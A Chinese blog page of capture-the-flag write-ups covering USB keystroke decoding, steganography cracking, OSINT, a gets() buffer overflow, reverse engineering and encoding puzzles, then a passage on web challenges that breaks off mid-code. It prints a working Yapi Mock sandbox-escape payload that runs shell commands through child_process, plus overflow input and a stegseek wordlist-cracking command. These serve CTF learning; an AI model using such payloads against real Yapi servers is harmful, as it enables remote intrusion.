class="hljs-string">&quot;_&quot;</span>,<span class="hljs-string">&quot;2e&quot;</span>:<span class="hljs-string">&quot;+&quot;</span>,<span class="hljs-string">&quot;2f&quot;</span>:<span class="hljs-string">&quot;&#123;&quot;</span>,<span class="hljs-string">&quot;30&quot;</span>:<span class="hljs-string">&quot;&#125;&quot;</span>,<span class="hljs-string">&quot;31&quot;</span>:<span class="hljs-string">&quot;|&quot;</span>,<span class="hljs-string">&quot;32&quot;</span>:<span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>,<span class="hljs-string">&quot;33&quot;</span>:<span class="hljs-string">&quot;\&quot;&quot;</span>,<br>          <span class="hljs-string">&quot;34&quot;</span>:<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-string">&quot;35&quot;</span>:<span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>,<span class="hljs-string">&quot;36&quot;</span>:<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;37&quot;</span>:<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;38&quot;</span>:<span class="hljs-string">&quot;?&quot;</span>,<span class="hljs-string">&quot;39&quot;</span>:<span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>,<span class="hljs-string">&quot;3a&quot;</span>:<span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>,<br>          <span class="hljs-string">&quot;3b&quot;</span>:<span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>:<span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>,<span class="hljs-string">&quot;3d&quot;</span>:<span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>,<span class="hljs-string">&quot;3e&quot;</span>:<span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>,<span class="hljs-string">&quot;3f&quot;</span>:<span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<span class="hljs-string">&quot;40&quot;</span>:<span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>,<br>          <span class="hljs-string">&quot;41&quot;</span>:<span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>,<span class="hljs-string">&quot;42&quot;</span>:<span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>,<span class="hljs-string">&quot;43&quot;</span>:<span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>,<span class="hljs-string">&quot;44&quot;</span>:<span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>,<span class="hljs-string">&quot;45&quot;</span>:<span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br>output = []<br>keys = open(<span class="hljs-string">&#x27;out.txt&#x27;</span>)<br><span class="hljs-keyword">for</span> line in keys:<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> line[<span class="hljs-number">0</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> (line[<span class="hljs-number">1</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">and</span> line[<span class="hljs-number">1</span>]!=<span class="hljs-string">&#x27;2&#x27;</span>) <span class="hljs-keyword">or</span> line[<span class="hljs-number">3</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">4</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">9</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">10</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">12</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">13</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">15</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">16</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">18</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">19</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">21</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">22</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>]==<span class="hljs-string">&quot;00&quot;</span>:<br>             <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>] in normalKeys.keys():<br>            output += [[normalKeys[line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>]]],[shiftKeys[line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>]]]][line[<span class="hljs-number">1</span>]==<span class="hljs-string">&#x27;2&#x27;</span>]<br>        <span class="hljs-keyword">else</span>:<br>            output += [<span class="hljs-string">&#x27;[unknown]&#x27;</span>]<br>    except:<br>        pass<br><br>keys.close()<br><br>flag=<span class="hljs-number">0</span><br><span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;&quot;</span>.join(output))<br><span class="hljs-keyword">for</span> i in range(len(output)):<br>    <span class="hljs-keyword">try</span>:<br>        a=output.index(<span class="hljs-string">&#x27;&lt;DEL&gt;&#x27;</span>)<br>        del output[a]<br>        del output[a<span class="hljs-number">-1</span>]<br>    except:<br>        pass<br><br><span class="hljs-keyword">for</span> i in range(len(output)):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> output[i]==<span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>:<br>            flag+=<span class="hljs-number">1</span><br>            output.pop(i)<br>            <span class="hljs-keyword">if</span> flag==<span class="hljs-number">2</span>:<br>                flag=<span class="hljs-number">0</span><br>        <span class="hljs-keyword">if</span> flag!=<span class="hljs-number">0</span>:<br>            output[i]=output[i].upper()<br>    except:<br>        pass<br><br><span class="hljs-keyword">print</span> (<span class="hljs-string">&#x27;output :&#x27;</span> + <span class="hljs-string">&quot;&quot;</span>.join(output))<br><br></code></pre></td></tr></table></figure>
<p>得到</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">┌──(kali㉿kali)-[~/桌面]<br>└─$ python keyboard2.py capture.pcap<br>flagusbp4ck3tc4ptur31sfun<br>output :flagusbp4ck3tc4ptur31sfun<br></code></pre></td></tr></table></figure>
<p>最终flag</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">flag&#123;usb_p4ck3t_c4ptur3_1s_fun&#125;<br></code></pre></td></tr></table></figure>
<h2 id="Maybe-the-helper-can-help"><a href="#Maybe-the-helper-can-help" class="headerlink" title="Maybe the helper can help*"></a>Maybe the helper can help*</h2><p>You might not see it, but a flag lies within.<br>Flag Format: flag{string}<br><a target="_blank" rel="noopener" href="https://defendingthesoc.ctf.cert.rcts.pt/files/381da97acc33337ebd29947e96a64489/the-jetsons-family.jpg?token=.eJyrViotTi2Kz0xRsjI2t9BRKklNzAXzDEG8tMycVAjPuBYAHzcM-w.YRKcRg.4xDdntnvO0prymoRoIRMSZgh-9c">the-jetsons-family.jpg</a></p>
<p>参考其他人的wp：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">使用 stegseek 我们得到的关键短语是 rosie<br>stegseek --crack the-jetsons-family.jpg --wordlist /usr/share/dict/rockyou.txt<br><br>cat the-jetsons-family.jpg.out<br><br>cat the-jetsons-family.jpg.out | base64 -d | base64 -d<br></code></pre></td></tr></table></figure>

<h1 id="OSINT"><a href="#OSINT" class="headerlink" title="OSINT"></a>OSINT</h1><h2 id="Welcome-to-Lisbon"><a href="#Welcome-to-Lisbon" class="headerlink" title="Welcome to Lisbon!"></a>Welcome to Lisbon!</h2><p>Oh, some activists defaced a Victoria Secret’s store.<br>Find out which was the model whose photo was damaged.<br>Flag format: flag{firstname_surname}</p>
<p>社工题</p>
<p>welcome_to_lisbon.jpg</p>
<p><img src="C:/Users/admin/AppData/Roaming/Typora/typora-user-images/image-20210815000735730.png" alt="image-20210815000735730"></p>
<p>从题目名字我们可以知道这家商店位于葡萄牙的里斯本，谷歌搜索 Victoria Secret  Lisbon可以找到店铺位置</p>
<p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202108/15/000615-289546.png" alt="image-20210815000614963"></p>
<p>题目所给图片被打码的就是这个模特，搜索Victoria Secret model可以找到是这位模特<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202108/15/000704-440418.png" alt="image-20210815000703316"></p>
<p>阿德瑞娜·利玛 (Adriana Lima)</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">flag&#123;adriana_lima&#125;<br></code></pre></td></tr></table></figure>
<h1 id="Mission"><a href="#Mission" class="headerlink" title="Mission"></a>Mission</h1><h2 id="Something-Suspicious"><a href="#Something-Suspicious" class="headerlink" title="Something Suspicious"></a>Something Suspicious</h2><p><strong>#mission#logging</strong><br>We have detected a strange activity inside our network and manage to get some logs from it.<br>Can you see what happened and if there was a host compromised?<br>Flag format: flag{string}<br><a target="_blank" rel="noopener" href="https://defendingthesoc.ctf.cert.rcts.pt/files/30cdb8a4f31d0b27758faeeac7ebda13/ftp.log?token=eyJ1c2VyX2lkIjozNzgsInRlYW1faWQiOjE3OCwiZmlsZV9pZCI6MjV9.YRKddA.92AZrYQTkmEqOoywWMhuxTJv9mE">ftp.log</a><br><a target="_blank" rel="noopener" href="https://defendingthesoc.ctf.cert.rcts.pt/files/cebf554150f74e6003e50daaf5397ac2/ssh.log?token=eyJ1c2VyX2lkIjozNzgsInRlYW1faWQiOjE3OCwiZmlsZV9pZCI6Mjl9.YRKddA.lt-3rgM4YA657U2VZWUICCxFi2Y">ssh.log</a>​</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">ftp.log:	ZmxhZ3tzMG0zdGgxbmc=  -&gt;  flag&#123;s0m3th1ng<br>ssh.log:	X3N1c3AxYzEwdXN9	    -&gt;  _susp1c10us&#125;<br></code></pre></td></tr></table></figure>
<p>最终flag</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">flag&#123;s0m3th1ng_susp1c10us&#125;<br></code></pre></td></tr></table></figure>



<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="Well-hello-there"><a href="#Well-hello-there" class="headerlink" title="Well hello there"></a>Well hello there</h2><p><strong>#pwn#c</strong><br>We initiated the development of a bot. So far it greets you by your name. Can you test it?<br>Access: nc challenges.defsoc.tk 22228<br>Flag format: flag{string}</p>
<p>拖入IDA查看main函数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span> __cdecl main(<span class="hljs-built_in">int</span> argc, const char **argv, const char **envp)<br>&#123;<br>  char v4[<span class="hljs-number">76</span>]; // [rsp+0h] [rbp-58h] BYREF<br>  <span class="hljs-built_in">int</span> v5; // [rsp+4Ch] [rbp-Ch]<br><br>  puts(<span class="hljs-string">&quot;Hello there! What is your name?&quot;</span>);<br>  fflush(_bss_start);<br>  v5 = <span class="hljs-number">0</span>;<br>  gets(v4, argv);<br>  <span class="hljs-keyword">if</span> ( v5 )<br>    system(<span class="hljs-string">&quot;cat flag.txt&quot;</span>);<br>  <span class="hljs-keyword">else</span><br>    printf(<span class="hljs-string">&quot;Well, hello %s!&quot;</span>, v4);<br>  putchar(<span class="hljs-number">10</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>缓冲区溢出,name超过 76 个字符即可</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─$ ./program_local        <br>Hello there! What is your name?<br>000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000<br>flag&#123;Waw!_Y0u_D1d!_it_^_^&#125;<br><br><br>$ nc challenges.defsoc.tk 22228   <br>Hello there! What is your name?<br>000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000<br>flag&#123;buff3r_0v3rfl0w_r0cks&#125;<br></code></pre></td></tr></table></figure>
<p>web手做出的第一个pwn题</p>
<h1 id="Reverse-Engineering"><a href="#Reverse-Engineering" class="headerlink" title="Reverse Engineering"></a>Reverse Engineering</h1><h2 id="You-are-not-allowed"><a href="#You-are-not-allowed" class="headerlink" title="You are not allowed"></a>You are not allowed</h2><p><strong>#reverse#c</strong><br>Can you reverse this program and get us the flag?<br>Flag format: flag{string}</p>
<p>这个逆向也很简单，拖入IDA找到main函数，然后F5，可以看到sub_401242函数</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a1, <span class="hljs-keyword">char</span> **a2, <span class="hljs-keyword">char</span> **a3)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> s[<span class="hljs-number">64</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-50h] BYREF</span><br>  <span class="hljs-keyword">char</span> *s1; <span class="hljs-comment">// [rsp+40h] [rbp-10h]</span><br>  <span class="hljs-keyword">int</span> v6; <span class="hljs-comment">// [rsp+4Ch] [rbp-4h]</span><br><br>  v6 = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Enter the secret key : &quot;</span>);<br>  fgets(s, <span class="hljs-number">64</span>, <span class="hljs-built_in">stdin</span>);<br>  s1 = sub_401242();<br>  <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strncmp</span>(s1, s, <span class="hljs-number">0xF</span>uLL) )<br>    v6 = <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Wrong key entered! Try again? &quot;</span>);<br>  <span class="hljs-keyword">if</span> ( v6 )<br>    sub_401182();<br>  <span class="hljs-built_in">putchar</span>(<span class="hljs-number">10</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>找到sub_401242函数，同样F5</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">char</span> *<span class="hljs-title">sub_401242</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> v1[<span class="hljs-number">15</span>]; <span class="hljs-comment">// [rsp+9h] [rbp-27h] BYREF</span><br>  <span class="hljs-keyword">char</span> *s; <span class="hljs-comment">// [rsp+18h] [rbp-18h]</span><br>  <span class="hljs-keyword">char</span> *dest; <span class="hljs-comment">// [rsp+20h] [rbp-10h]</span><br>  <span class="hljs-keyword">unsigned</span> __int64 i; <span class="hljs-comment">// [rsp+28h] [rbp-8h]</span><br><br>  qmemcpy(v1, <span class="hljs-string">&quot;Sup3rS3cr3tK3y#&quot;</span>, <span class="hljs-keyword">sizeof</span>(v1));<br>  dest = (<span class="hljs-keyword">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">4uLL</span>);<br>  s = (<span class="hljs-keyword">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1F</span>uLL);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0LL</span>; i &lt;= <span class="hljs-number">0xE</span>; ++i )<br>  &#123;<br>    <span class="hljs-built_in">sprintf</span>(s, <span class="hljs-string">&quot;%c&quot;</span>, (<span class="hljs-keyword">unsigned</span> __int8)v1[i]);<br>    <span class="hljs-built_in">strcat</span>(dest, s);<br>  &#125;<br>  <span class="hljs-keyword">return</span> dest;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>可以看到字符串Sup3rS3cr3tK3y#，输入即可得到flag</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">┌──(kali㉿kali)-[~/桌面]<br>└─$ ./program<br>Enter the secret key : <br>Sup3rS3cr3tK3y<span class="hljs-comment">#</span><br>flag&#123;<span class="hljs-number">1</span>ntr0_t0_r3v3rs3_3ng1n33r1ng&#125;<br><br></code></pre></td></tr></table></figure>



<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="A-simple-challenge"><a href="#A-simple-challenge" class="headerlink" title="A simple challenge"></a>A simple challenge</h2><p><strong>#crypto#encoding</strong><br>We have intercepted the following message and we think it has a secret flag in it.<br>Can you decode it?<br>Flag format: flag{string}<br>​</p>
<p>secret_message.txt：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Vm0weE1HRXlTWGxVYTJoVllXeGFVMWx0ZEV0alZuQlhWbXQwYVUxVk5WZFpWVlUxWVZaS2RHUkVXbFpOYWtVd1dWUkdSbVF4VG5GUmJHaHBVakpvVVZkc1pEUmpNV1JIWTBWb2JGSnJTbTlXYkZaM1RVWmtXR1JIZEZOTmEzQXdWbTF3WVZaWFNuTlhiVVpoVmpOU1RGa3llRk5XTVd3MlVtMXNhVkl5WTNsV1Z6QXhaREZrVmsxWVJsWmhhelZvVld4YWNrMUdjRmhOVlhSclVteEtNVmxyWkRSWFJrcFdZa1JPVjFKc2NGUlZWRXBUVm0xS1IySkZOVk5TUlVVMQ==<br></code></pre></td></tr></table></figure>
<p>exp：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php">import base64<br>str=<span class="hljs-string">&quot;Vm0weE1HRXlTWGxVYTJoVllXeGFVMWx0ZEV0alZuQlhWbXQwYVUxVk5WZFpWVlUxWVZaS2RHUkVXbFpOYWtVd1dWUkdSbVF4VG5GUmJHaHBVakpvVVZkc1pEUmpNV1JIWTBWb2JGSnJTbTlXYkZaM1RVWmtXR1JIZEZOTmEzQXdWbTF3WVZaWFNuTlhiVVpoVmpOU1RGa3llRk5XTVd3MlVtMXNhVkl5WTNsV1Z6QXhaREZrVmsxWVJsWmhhelZvVld4YWNrMUdjRmhOVlhSclVteEtNVmxyWkRSWFJrcFdZa1JPVjFKc2NGUlZWRXBUVm0xS1IySkZOVk5TUlVVMQ==&quot;</span><br>num=<span class="hljs-number">0</span>  <br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span> :<br>        num=num+<span class="hljs-number">1</span><br>        <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;第%d次解码&quot;</span> %(num))<br>        str = base64.b64decode(str.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>        str=str.decode(<span class="hljs-string">&#x27;ascii&#x27;</span>)<br>        <span class="hljs-keyword">print</span>(str)<br>except <span class="hljs-built_in">Exception</span> <span class="hljs-keyword">as</span> e:<br>     <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;END&quot;</span>)      <br></code></pre></td></tr></table></figure>
<p>得到</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">This is a secret message: flag&#123;<span class="hljs-number">3</span>nc0d1ng_1s_n0t_3ncrypt10n!&#125;<br></code></pre></td></tr></table></figure>



<h2 id="Roman-encryption"><a href="#Roman-encryption" class="headerlink" title="Roman encryption"></a>Roman encryption</h2><p><strong>#crypto#cipher</strong><br>We intercepted an encrypted communication that was meant to be delivered to a threat actor named Julius.<br>Apparently his name is the key to decipher this message.<br>Can you decipher it?<br>Flag format: flag{string}</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">Csddk Rtdetp,<br>Qcghb ykt jko ykto ptmmkoq,<br>Ykt igh tps qcep bsy qk osisevs ykto oswgou: jdgl&#123;<span class="hljs-number">5</span>ta5q1qtq10h_1p_b3y&#125;<br></code></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://quipqiup.com/">https://quipqiup.com/</a>令jdgl=flag</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Hello Julius, Thank you <span class="hljs-keyword">for</span> your support, You can <span class="hljs-keyword">use</span> <span class="hljs-title">this</span> <span class="hljs-title">key</span> <span class="hljs-title">to</span> <span class="hljs-title">receive</span> <span class="hljs-title">your</span> <span class="hljs-title">reward</span>: <span class="hljs-title">flag</span>&#123;5<span class="hljs-title">um5t1tut10n_1s_k3y</span>&#125;<br></code></pre></td></tr></table></figure>
<p>提交flag不对，继续查看题目提示，应该是带key的凯撒密码<br>​</p>
<p>解密网站：<a target="_blank" rel="noopener" href="https://www.boxentriq.com/code-breaking/keyed-caesar-cipher">https://www.boxentriq.com/code-breaking/keyed-caesar-cipher</a><br>搜索 Julius得到全称Gaius Julius Caesar，即为key解密得到flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">Niji ce uni pieebai:<br>Hello Julius,<br>Thank you <span class="hljs-keyword">for</span> your support,<br>You can use this key to receive your reward: flag&#123;5ub5t1tut10n_1s_k3y&#125;<br></code></pre></td></tr></table></figure>
<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="Hextraordinary-security"><a href="#Hextraordinary-security" class="headerlink" title="Hextraordinary security"></a>Hextraordinary security</h2><p><strong>#crypto#encoding</strong><br>We just found this garbage file.<br>Can you decode it and retrieve any useful information from it?<br>Flag format: flag{string}<br>​</p>
<p>hex转str</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">flag&#123;h3x4d3c1m4l_4s_4n_0bfusc4t10n_t00l&#125;<br></code></pre></td></tr></table></figure></div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/09/2021DASCTF-July-X-CBCTF-4th/">2021DASCTF July X CBCTF 4th</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2021-08-09</span></span><span class="post-meta-item post-meta-item--wordcount"><span class="post-meta-item__icon"><i class="far fa-file-word"></i></span><span class="post-meta-item__info">字数统计</span><span class="post-meta-item__value">3k</span></span></div></header><div class="post-body"><div class="post-excerpt"><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="Yusa的密码学签到——BlockTrick"><a href="#Yusa的密码学签到——BlockTrick" class="headerlink" title="Yusa的密码学签到——BlockTrick"></a>Yusa的密码学签到——BlockTrick</h2><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs llvm">┌──(kali㉿kali)-[~/桌面]<br>└─$ nc node<span class="hljs-number">4</span>.buuoj.cn <span class="hljs-number">25870</span>                                                                                                                                                      <span class="hljs-number">1</span> ⨯<br>d<span class="hljs-number">1930e58</span>ab<span class="hljs-number">00552</span>f<span class="hljs-number">066</span>efa<span class="hljs-number">012</span>f<span class="hljs-number">80</span><span class="hljs-keyword">c</span><span class="hljs-number">17</span>b<br>d<span class="hljs-number">1930e58</span>ab<span class="hljs-number">00552</span>f<span class="hljs-number">066</span>efa<span class="hljs-number">012</span>f<span class="hljs-number">80</span><span class="hljs-keyword">c</span><span class="hljs-number">17</span>b<br><span class="hljs-number">981</span>baee<span class="hljs-number">22</span>bc<span class="hljs-number">0</span>cfd<span class="hljs-number">2233769</span>fbf<span class="hljs-number">32336</span>ce<br>Try again<br><span class="hljs-number">981</span>baee<span class="hljs-number">22</span>bc<span class="hljs-number">0</span>cfd<span class="hljs-number">2233769</span>fbf<span class="hljs-number">32336</span>ce<br>flag&#123;<span class="hljs-number">30</span>cf<span class="hljs-number">1012</span>-e<span class="hljs-number">303</span><span class="hljs-number">-4</span>caf<span class="hljs-number">-98</span>ba-d<span class="hljs-number">63</span>f<span class="hljs-number">3591e9</span>cd&#125;<br></code></pre></td></tr></table></figure>


<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="ezrce"><a href="#ezrce" class="headerlink" title="ezrce"></a>ezrce</h2><h4 id="Yapi-Mock-远程命令执行漏洞"><a href="#Yapi-Mock-远程命令执行漏洞" class="headerlink" title="Yapi Mock 远程命令执行漏洞"></a>Yapi Mock 远程命令执行漏洞</h4><p>添加项目—&gt;添加接口—&gt;选择高级Mock—&gt;勾选脚本—&gt;将开启按钮打开—&gt;然后将PoC写在脚本中保存</p>
<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">const</span> sandbox = <span class="hljs-keyword">this</span><br><span class="hljs-keyword">const</span> ObjectConstructor = <span class="hljs-keyword">this</span>.<span class="hljs-keyword">constructor</span><br><span class="hljs-keyword">const</span> FunctionConstructor = ObjectConstructor.<span class="hljs-keyword">constructor</span><br><span class="hljs-keyword">const</span> myfun = FunctionConstructor(<span class="hljs-string">&#x27;return process&#x27;</span>)<br><span class="hljs-keyword">const</span> process = myfun()<br>mockJson = process.mainModule.require(<span class="hljs-string">&quot;child_process&quot;</span>).execSync(<span class="hljs-string">&quot;ls /&amp; cat /ffffffflllllaggggg&quot;</span>).toString()<br></code></pre></td></tr></table></figure>
<p>访问预览地址，回显命令执行结果getflag</p>
<h2 id="cat-flag"><a href="#cat-flag" class="headerlink" title="cat flag"></a>cat flag</h2><h4 id="非ascii字符绕过escapeshellarg"><a href="#非ascii字符绕过escapeshellarg" class="headerlink" title="非ascii字符绕过escapeshellarg"></a>非ascii字符绕过escapeshellarg</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>    <span class="hljs-keyword">if</span> 